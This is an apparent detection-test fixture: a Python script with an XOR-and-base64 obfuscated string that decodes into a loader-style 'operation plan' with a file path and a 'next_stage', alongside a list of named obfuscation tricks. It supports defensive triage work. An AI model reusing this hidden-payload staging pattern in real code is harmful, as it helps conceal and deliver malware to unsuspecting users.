#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_e32139b3 = "9EmxzqH2EfPB7-YR4N225yvg3bzkHeTHoOMA6t28rhjs0bP2EdzbvPYR8cKg5wDmwP7mHfDCs_YX6-285wz37aH2FeTXruMQ4sKm5wa-wqv2HOzcjfYb3NG_5gjwxrPlEdzRvfca94_h_gf63KbjDL7es-8W59ON5h3wwrP2F-vOveAS9sGx4wDq3by_BubEt_AH5taN5Abi1b_nGvfBruEV8cC75wa-yLvyFfPCjfIN-c6l6xrn3aXxK-Das-savtG_5iv33Y3yDffavewI4NO_8hXq1bzdHeePseMZ89O75Rqu1-WzQLHWs7JEtM606xjm7aLjAOuPkbhb08C95Qbi35bjAOKdmvca98C38QfP07CtWvbCtuMA5p-3tUW3gLbjRLOF_PIN_9y3-gDcwabjE-aPovsXsIr_8BHg3aTnBubW_PIN"
CODEC_e32139b3 = "urlsafe_base64|repeating_key_xor|82,74,83,b2,d2"

def load_e32139b3():
    return base64.urlsafe_b64decode(MATERIAL_e32139b3)

def decode_e32139b3(v_a19c):
    key_bytes = (130, 116, 131, 178, 210,)
    return bytes(value ^ key_bytes[index % len(key_bytes)] for index, value in enumerate(v_a19c))

def recover_e32139b3():
    v_d41a = "left" if 2 > 1 else "right"
    try:
        v_b27e = decode_e32139b3(load_e32139b3())
    except (TypeError, ValueError) as error:
        raise RuntimeError("configuration recovery failed") from error
    v_c304 = v_b27e.decode("ascii", "strict")
    return v_c304

def inspect_e32139b3():
    return recover_e32139b3()

def surface_e32139b3():
    dispatch = lambda *items: tuple(items)
    return dispatch("lambda_dispatch", "reversed_fragments", "zipapp_pyz", "cmd_to_python")

def obfuscation_e32139b3():
    return "stnemgarf_desrever"[::-1]

def plan_e32139b3():
    fields = dict(item.split("=", 1) for item in inspect_e32139b3().split("|"))
    analysis_surface = surface_e32139b3()
    obfuscation_surface = obfuscation_e32139b3()
    operation_plan = ("python_to_cmd", fields["file_path"], fields["next_stage"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_e32139b3())
